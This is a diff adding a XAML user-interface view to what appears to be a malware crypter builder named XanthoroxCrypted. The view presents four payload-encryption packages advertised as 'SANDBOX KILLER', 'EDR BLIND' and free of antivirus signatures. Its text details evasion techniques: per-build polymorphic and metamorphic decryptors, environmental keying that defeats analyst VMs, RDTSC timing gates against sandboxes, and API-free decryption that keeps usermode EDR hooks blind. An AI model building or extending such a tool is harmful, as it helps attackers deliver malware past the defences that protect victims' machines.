@@ -1,0 +1,360 @@
+<UserControl x:Class="XanthoroxCrypted.Views.ResearchView"
+             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
+             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
+             mc:Ignorable="d" 
+             d:DesignHeight="700" d:DesignWidth="820">
+
+    <ScrollViewer VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled" Padding="24,20">
+        <StackPanel MaxWidth="780">
+
+            <!-- ═══ HEADER ═══ -->
+            <StackPanel Margin="0,0,0,16">
+                <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
+                    <TextBlock Text="RESEARCH GRADE" FontWeight="Bold" FontSize="17"
+                               Foreground="{StaticResource Brush_Cyan}" VerticalAlignment="Center"/>
+                    <Border Background="#1A00D4FF" CornerRadius="4" Padding="8,3" Margin="12,0,0,0" VerticalAlignment="Center">
+                        <TextBlock Text="EXPERIMENTAL" FontSize="9" FontWeight="SemiBold"
+                                   Foreground="{StaticResource Brush_Cyan}"/>
+                    </Border>
+                </StackPanel>
+                <TextBlock TextWrapping="Wrap" FontSize="11.5" Foreground="{StaticResource Brush_TextSecondary}"
+                           Text="Next-generation encryption packages with no known AV signatures. Each replaces the standard cipher entirely. Select one to override the Builder's encryption method."/>
+                <TextBlock TextWrapping="Wrap" FontSize="10.5" Foreground="{StaticResource Brush_TextTertiary}" Margin="0,6,0,0"
+                           Text="⚠ Only one research package can be active at a time. When active, the Builder tab's encryption dropdown is ignored."/>
+            </StackPanel>
+
+            <!-- ═══ CARD 1: GHOST PROTOCOL ═══ -->
+            <Border x:Name="CardGhost" Style="{StaticResource Style_Card}" Cursor="Hand"
+                    MouseLeftButtonUp="CardGhost_Click" Margin="0,0,0,10">
+                <Border.BorderBrush>
+                    <SolidColorBrush x:Name="BorderGhost" Color="Transparent"/>
+                </Border.BorderBrush>
+                <Border.BorderThickness>1.5</Border.BorderThickness>
+                <StackPanel>
+                    <!-- Header row -->
+                    <Grid>
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="Auto"/>
+                            <ColumnDefinition Width="*"/>
+                            <ColumnDefinition Width="Auto"/>
+                        </Grid.ColumnDefinitions>
+
+                        <StackPanel Grid.Column="0" Orientation="Horizontal">
+                            <TextBlock Text="🔮" FontSize="20" VerticalAlignment="Center" Margin="0,0,10,0"/>
+                            <StackPanel>
+                                <TextBlock Text="GHOST PROTOCOL" FontWeight="Bold" FontSize="14"
+                                           Foreground="{StaticResource Brush_TextPrimary}"/>
+                                <TextBlock Text="Transform Chain Cipher" FontSize="10.5"
+                                           Foreground="{StaticResource Brush_TextTertiary}"/>
+                            </StackPanel>
+                        </StackPanel>
+
+                        <StackPanel Grid.Column="2" Orientation="Horizontal" VerticalAlignment="Center">
+                            <Border Background="#1A3FB950" CornerRadius="3" Padding="6,2" Margin="0,0,8,0">
+                                <TextBlock Text="NO KNOWN SIGS" FontSize="9" FontWeight="SemiBold" Foreground="{StaticResource Brush_Green}"/>
+                            </Border>
+                            <CheckBox x:Name="ChkGhost" IsChecked="False" 
+                                      Checked="ChkGhost_Checked" Unchecked="ChkGhost_Unchecked"
+                                      VerticalAlignment="Center"/>
+                        </StackPanel>
+                    </Grid>
+
+                    <TextBlock TextWrapping="Wrap" Margin="30,8,0,0" FontSize="11"
+                               Foreground="{StaticResource Brush_TextSecondary}"
+                               Text="5 reversible mathematical transforms chained together. Every build generates unique affine constants, Galois Field polynomials, bit permutations, and S-boxes. No standard algorithm exists for AV to match — the cipher IS the build."/>
+
+                    <!-- Expandable tech details -->
+                    <Border x:Name="DetailGhost" Visibility="Collapsed"
+                            Background="#08FFFFFF" CornerRadius="6" Margin="0,12,0,0" Padding="14,12">
+                        <StackPanel>
+                            <TextBlock Text="HOW IT WORKS" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_Cyan}" Margin="0,0,0,8"/>
+
+                            <TextBlock Text="Layer 1 — Affine Permutation" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="enc(x) = (a × x + b) mod 256. Random coprime 'a' and random 'b' per build. 128 possible 'a' values × 256 'b' values = 32,768 variants per layer."/>
+
+                            <TextBlock Text="Layer 2 — Galois Field Multiplication" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="GF(2⁸) multiplication with random generator polynomial. Each byte transformed through finite field arithmetic. Irreducible polynomial randomized per build."/>
+
+                            <TextBlock Text="Layer 3 — Bit Transposition" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="64-entry bit permutation table scrambles bit positions across 8-byte blocks. 8! = 40,320 possible permutations per block boundary."/>
+
+                            <TextBlock Text="Layer 4 — Dynamic S-Box" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="256-byte substitution table generated deterministically from a CSPRNG seed. Like the AES S-box but unique per build. 256! ≈ 10⁵⁰⁷ possible tables."/>
+
+                            <TextBlock Text="Layer 5 — CSPRNG XOR Stream" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}"
+                                       Text="Final XOR with SHA-512-derived keystream. Provides cryptographic strength backing the algebraic transforms above."/>
+                        </StackPanel>
+                    </Border>
+                </StackPanel>
+            </Border>
+
+            <!-- ═══ CARD 2: NEUROMANCER ═══ -->
+            <Border x:Name="CardNeuro" Style="{StaticResource Style_Card}" Cursor="Hand"
+                    MouseLeftButtonUp="CardNeuro_Click" Margin="0,0,0,10">
+                <Border.BorderBrush>
+                    <SolidColorBrush x:Name="BorderNeuro" Color="Transparent"/>
+                </Border.BorderBrush>
+                <Border.BorderThickness>1.5</Border.BorderThickness>
+                <StackPanel>
+                    <Grid>
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="Auto"/>
+                            <ColumnDefinition Width="*"/>
+                            <ColumnDefinition Width="Auto"/>
+                        </Grid.ColumnDefinitions>
+
+                        <StackPanel Grid.Column="0" Orientation="Horizontal">
+                            <TextBlock Text="⚡" FontSize="20" VerticalAlignment="Center" Margin="0,0,10,0"/>
+                            <StackPanel>
+                                <TextBlock Text="NEUROMANCER" FontWeight="Bold" FontSize="14"
+                                           Foreground="{StaticResource Brush_TextPrimary}"/>
+                                <TextBlock Text="Environmental Keying + Time Lock" FontSize="10.5"
+                                           Foreground="{StaticResource Brush_TextTertiary}"/>
+                            </StackPanel>
+                        </StackPanel>
+
+                        <StackPanel Grid.Column="2" Orientation="Horizontal" VerticalAlignment="Center">
+                            <Border Background="#1AFF6B00" CornerRadius="3" Padding="6,2" Margin="0,0,8,0">
+                                <TextBlock Text="SANDBOX KILLER" FontSize="9" FontWeight="SemiBold" Foreground="#FFFF8C00"/>
+                            </Border>
+                            <CheckBox x:Name="ChkNeuro" IsChecked="False"
+                                      Checked="ChkNeuro_Checked" Unchecked="ChkNeuro_Unchecked"
+                                      VerticalAlignment="Center"/>
+                        </StackPanel>
+                    </Grid>
+
+                    <TextBlock TextWrapping="Wrap" Margin="30,8,0,0" FontSize="11"
+                               Foreground="{StaticResource Brush_TextSecondary}"
+                               Text="The decryption key doesn't exist in the binary. It's derived at runtime from 5 machine-specific environment factors + a time-lock puzzle. Wrong machine = wrong key = corrupted output. Sandboxes, VMs, and analyst machines all produce a different key."/>
+
+                    <Border x:Name="DetailNeuro" Visibility="Collapsed"
+                            Background="#08FFFFFF" CornerRadius="6" Margin="0,12,0,0" Padding="14,12">
+                        <StackPanel>
+                            <TextBlock Text="HOW IT WORKS" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="#FFFF8C00" Margin="0,0,0,8"/>
+
+                            <TextBlock Text="Environment Factors" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,4"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,4"
+                                       Text="• Factor 1: SHA-256(hostname) — unique per machine name"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,4"
+                                       Text="• Factor 2: SHA-256(username) — unique per logged-in user"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,4"
+                                       Text="• Factor 3: SHA-256(Windows Product ID) — unique per Windows install"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,4"
+                                       Text="• Factor 4: SHA-256(C:\ drive serial number) — unique per disk"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="• Factor 5: SHA-256(CPU brand string) — unique per CPU model"/>
+
+                            <TextBlock Text="Time-Lock Puzzle" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="4096 sequential SHA-256 hashes after environment mixing. Takes ~2 seconds on real hardware. Cannot be parallelized. Emulators must spend real time or produce wrong key."/>
+
+                            <TextBlock Text="Inner Cipher" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}"
+                                       Text="ChaCha20 stream cipher (RFC 8439) with the derived environmental key. Pure math — zero crypto API calls. Even if someone reverse-engineers the derivation, they'd need access to the exact target machine to reproduce the key."/>
+                        </StackPanel>
+                    </Border>
+                </StackPanel>
+            </Border>
+
+            <!-- ═══ CARD 3: DARKNET CIPHER ═══ -->
+            <Border x:Name="CardDarknet" Style="{StaticResource Style_Card}" Cursor="Hand"
+                    MouseLeftButtonUp="CardDarknet_Click" Margin="0,0,0,10">
+                <Border.BorderBrush>
+                    <SolidColorBrush x:Name="BorderDarknet" Color="Transparent"/>
+                </Border.BorderBrush>
+                <Border.BorderThickness>1.5</Border.BorderThickness>
+                <StackPanel>
+                    <Grid>
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="Auto"/>
+                            <ColumnDefinition Width="*"/>
+                            <ColumnDefinition Width="Auto"/>
+                        </Grid.ColumnDefinitions>
+
+                        <StackPanel Grid.Column="0" Orientation="Horizontal">
+                            <TextBlock Text="💀" FontSize="20" VerticalAlignment="Center" Margin="0,0,10,0"/>
+                            <StackPanel>
+                                <TextBlock Text="DARKNET CIPHER" FontWeight="Bold" FontSize="14"
+                                           Foreground="{StaticResource Brush_TextPrimary}"/>
+                                <TextBlock Text="Custom Feistel + White-Box + Metamorphic" FontSize="10.5"
+                                           Foreground="{StaticResource Brush_TextTertiary}"/>
+                            </StackPanel>
+                        </StackPanel>
+
+                        <StackPanel Grid.Column="2" Orientation="Horizontal" VerticalAlignment="Center">
+                            <Border Background="#1AFF0040" CornerRadius="3" Padding="6,2" Margin="0,0,8,0">
+                                <TextBlock Text="ZERO FOOTPRINT" FontSize="9" FontWeight="SemiBold" Foreground="#FFFF4081"/>
+                            </Border>
+                            <CheckBox x:Name="ChkDarknet" IsChecked="False"
+                                      Checked="ChkDarknet_Checked" Unchecked="ChkDarknet_Unchecked"
+                                      VerticalAlignment="Center"/>
+                        </StackPanel>
+                    </Grid>
+
+                    <TextBlock TextWrapping="Wrap" Margin="30,8,0,0" FontSize="11"
+                               Foreground="{StaticResource Brush_TextSecondary}"
+                               Text="A cipher that doesn't exist in any database. Custom 16-round Feistel network with per-build S-boxes and pre-computed round keys, cascaded under ChaCha20. Key whitening XOR before and after the Feistel provides additional diffusion. All stub crypto uses pure-math — zero BCrypt API calls."/>
+
+                    <Border x:Name="DetailDarknet" Visibility="Collapsed"
+                            Background="#08FFFFFF" CornerRadius="6" Margin="0,12,0,0" Padding="14,12">
+                        <StackPanel>
+                            <TextBlock Text="HOW IT WORKS" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="#FFFF4081" Margin="0,0,0,8"/>
+
+                            <TextBlock Text="Outer Layer — Custom Feistel Network" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="16 rounds of a balanced Feistel cipher. Each round uses per-build S-boxes (256-byte substitution tables) and a P-box (bit permutation). All 16 round keys are pre-computed at build time — no HMAC calls at runtime. No AV has ever seen this cipher."/>
+
+                            <TextBlock Text="Inner Layer — ChaCha20" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="Before Feistel encryption, payload is first encrypted with ChaCha20 (RFC 8439) stream cipher. Pure math — zero API calls. Even if someone cracks the Feistel (requires knowing the S-boxes), they still face ChaCha20."/>
+
+                            <TextBlock Text="Key Whitening" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="32-byte random whitening key XOR'd before and after the Feistel network. Provides additional diffusion and prevents known-plaintext attacks against the Feistel structure."/>
+
+                            <TextBlock Text="Metamorphic Decryptor" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}"
+                                       Text="The decryption routine itself is regenerated each build with randomized register allocation, equivalent instruction substitutions (ADD↔SUB, XOR↔NOT+AND), and control flow mutations. No two builds share instruction sequences."/>
+                        </StackPanel>
+                    </Border>
+                </StackPanel>
+            </Border>
+
+            <!-- ═══ CARD 4: VOID WALKER ═══ -->
+            <Border x:Name="CardVoid" Style="{StaticResource Style_Card}" Cursor="Hand"
+                    MouseLeftButtonUp="CardVoid_Click" Margin="0,0,0,10">
+                <Border.BorderBrush>
+                    <SolidColorBrush x:Name="BorderVoid" Color="Transparent"/>
+                </Border.BorderBrush>
+                <Border.BorderThickness>1.5</Border.BorderThickness>
+                <StackPanel>
+                    <Grid>
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="Auto"/>
+                            <ColumnDefinition Width="*"/>
+                            <ColumnDefinition Width="Auto"/>
+                        </Grid.ColumnDefinitions>
+
+                        <StackPanel Grid.Column="0" Orientation="Horizontal">
+                            <TextBlock Text="👻" FontSize="20" VerticalAlignment="Center" Margin="0,0,10,0"/>
+                            <StackPanel>
+                                <TextBlock Text="VOID WALKER" FontWeight="Bold" FontSize="14"
+                                           Foreground="{StaticResource Brush_TextPrimary}"/>
+                                <TextBlock Text="Zero-API + RDTSC + SipHash MAC" FontSize="10.5"
+                                           Foreground="{StaticResource Brush_TextTertiary}"/>
+                            </StackPanel>
+                        </StackPanel>
+
+                        <StackPanel Grid.Column="2" Orientation="Horizontal" VerticalAlignment="Center">
+                            <Border Background="#1A8A2BE2" CornerRadius="3" Padding="6,2" Margin="0,0,8,0">
+                                <TextBlock Text="EDR BLIND" FontSize="9" FontWeight="SemiBold" Foreground="#FF8A2BE2"/>
+                            </Border>
+                            <CheckBox x:Name="ChkVoid" IsChecked="False"
+                                      Checked="ChkVoid_Checked" Unchecked="ChkVoid_Unchecked"
+                                      VerticalAlignment="Center"/>
+                        </StackPanel>
+                    </Grid>
+
+                    <TextBlock TextWrapping="Wrap" Margin="30,8,0,0" FontSize="11"
+                               Foreground="{StaticResource Brush_TextSecondary}"
+                               Text="Not a single Windows API call during the entire decrypt chain. ChaCha20, HMAC-SHA256, SipHash-2-4 — all implemented in pure CPU arithmetic. EDR usermode hooks are completely blind. RDTSC timing gate detects sandbox emulators. SipHash MAC verifies payload integrity before execution."/>
+
+                    <Border x:Name="DetailVoid" Visibility="Collapsed"
+                            Background="#08FFFFFF" CornerRadius="6" Margin="0,12,0,0" Padding="14,12">
+                        <StackPanel>
+                            <TextBlock Text="HOW IT WORKS" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="#FF8A2BE2" Margin="0,0,0,8"/>
+
+                            <TextBlock Text="Zero-API Philosophy" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="Every other encryption package calls Windows APIs — BCryptOpenAlgorithmProvider, BCryptEncrypt, GetProcessHeap — all hookable by EDR in usermode. VOID WALKER calls ZERO Windows APIs during the entire decrypt chain. Every operation (key derivation, decryption, integrity check) is pure CPU arithmetic: ADD, XOR, rotate, shift. EDR hooks on ntdll/kernel32/bcrypt see nothing because nothing is called."/>
+
+                            <TextBlock Text="Step 0 — RDTSC Anti-Emulation Gate" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="Before decryption begins, RDTSC (Read Time Stamp Counter) measures CPU cycle count for a calibration loop of 1000 iterations. Real hardware: 500-5000 cycles. AV sandboxes and emulators: >20,000 (usually >50,000). If timing exceeds the threshold embedded at build time, decryption aborts silently — payload never touches memory in decrypted form."/>
+
+                            <TextBlock Text="Step 1 — Key Derivation (HMAC-SHA256)" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="HMAC-SHA256(salt, masterKey) derives the ChaCha20 decryption key. The 16-byte salt is unique per build, embedded in the 59-byte parameter blob. SHA-256 is implemented inline — 64 rounds of pure arithmetic (Ch, Maj, Σ, σ functions). Not a single BCrypt or CNG call."/>
+
+                            <TextBlock Text="Step 2 — ChaCha20 Stream Cipher (RFC 8439)" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="256-bit key, 96-bit nonce, 32-bit counter. 20 rounds (10 double-rounds of quarter-round operations: ADD, XOR, left-rotate). Generates 64-byte keystream blocks XOR'd with ciphertext. Entire implementation is pure register arithmetic — no lookup tables, no API calls, no memory allocation."/>
+
+                            <TextBlock Text="Step 3 — SipHash-2-4 Integrity MAC" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,8"
+                                       Text="After decryption, a 64-bit SipHash-2-4 is computed over the plaintext using a 128-bit key embedded at build time. The computed MAC is compared to the expected MAC from the parameter blob. Wrong decryption key, tampered ciphertext, or modified binary → MAC mismatch → output zeroed with SecureZero before any execution path is reached."/>
+
+                            <TextBlock Text="Polymorphic Variant System" FontWeight="SemiBold" FontSize="10.5"
+                                       Foreground="{StaticResource Brush_TextPrimary}" Margin="0,0,0,2"/>
+                            <TextBlock TextWrapping="Wrap" FontSize="10" Foreground="{StaticResource Brush_TextSecondary}"
+                                       Text="Each build embeds a polymorphic variant index (0-3) and a junk instruction seed. These control the decryption bootstrap's code shape — different register allocation, instruction ordering, and junk instruction padding per build. AV static signatures against the decryptor code break on the next build."/>
+                        </StackPanel>
+                    </Border>
+                </StackPanel>
+            </Border>
+
+            <!-- ═══ STATUS INFO ═══ -->
+            <Border Style="{StaticResource Style_Card}" Margin="0,6,0,0">
+                <StackPanel>
+                    <Grid>
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="*"/>
+                            <ColumnDefinition Width="*"/>
+                            <ColumnDefinition Width="*"/>
+                        </Grid.ColumnDefinitions>
+
+                        <StackPanel Grid.Column="0" HorizontalAlignment="Center">
+                            <TextBlock Text="ACTIVE PACKAGE" FontSize="9" Foreground="{StaticResource Brush_TextTertiary}"
+                                       HorizontalAlignment="Center"/>
+                            <TextBlock x:Name="LblActivePackage" Text="None" FontSize="12" FontWeight="SemiBold"
+                                       Foreground="{StaticResource Brush_TextSecondary}" HorizontalAlignment="Center" Margin="0,2,0,0"/>
+                        </StackPanel>
+
+                        <StackPanel Grid.Column="1" HorizontalAlignment="Center">
+                            <TextBlock Text="CIPHER STRENGTH" FontSize="9" Foreground="{StaticResource Brush_TextTertiary}"
+                                       HorizontalAlignment="Center"/>
+                            <TextBlock x:Name="LblStrength" Text="—" FontSize="12" FontWeight="SemiBold"
+                                       Foreground="{StaticResource Brush_TextSecondary}" HorizontalAlignment="Center" Margin="0,2,0,0"/>
+                        </StackPanel>
+
+                        <StackPanel Grid.Column="2" HorizontalAlignment="Center">
+                            <TextBlock Text="AV SIGNATURES" FontSize="9" Foreground="{StaticResource Brush_TextTertiary}"
+                                       HorizontalAlignment="Center"/>
+                            <TextBlock x:Name="LblSigs" Text="—" FontSize="12" FontWeight="SemiBold"
+                                       Foreground="{StaticResource Brush_TextSecondary}" HorizontalAlignment="Center" Margin="0,2,0,0"/>
+                        </StackPanel>
+                    </Grid>
+                </StackPanel>
+            </Border>
+
+        </StackPanel>
+    </ScrollViewer>
+</UserControl>
